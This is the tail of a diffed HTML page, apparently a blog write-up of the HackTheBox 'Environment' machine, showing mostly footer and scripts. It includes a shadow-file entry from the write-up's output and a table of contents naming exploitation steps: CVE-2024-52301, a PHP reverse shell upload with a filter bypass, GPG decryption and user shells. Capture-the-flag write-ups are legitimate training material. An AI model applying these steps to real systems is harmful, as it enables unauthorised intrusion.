class="line">_laurel:!:20185::::::</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-52301"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2024-52301</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-php-reverse-shell-and-bypass"><span class="toc-number">1.3.</span> <span class="toc-text">upload php reverse shell and bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-www-data"><span class="toc-number">2.</span> <span class="toc-text">shell as www-data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#database-sqlite-rabbit-hole"><span class="toc-number">2.1.</span> <span class="toc-text">database.sqlite rabbit hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gpg-decrypt"><span class="toc-number">2.2.</span> <span class="toc-text">gpg decrypt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-hish"><span class="toc-number">3.</span> <span class="toc-text">shell as hish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">4.</span> <span class="toc-text">Hashes</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&text=HackTheBox——HTB Environment Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&is_video=false&description=HackTheBox——HTB Environment Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Environment Writeup&body=Check out this article: https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&title=HackTheBox——HTB Environment Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&name=HackTheBox——HTB Environment Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/&t=HackTheBox——HTB Environment Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
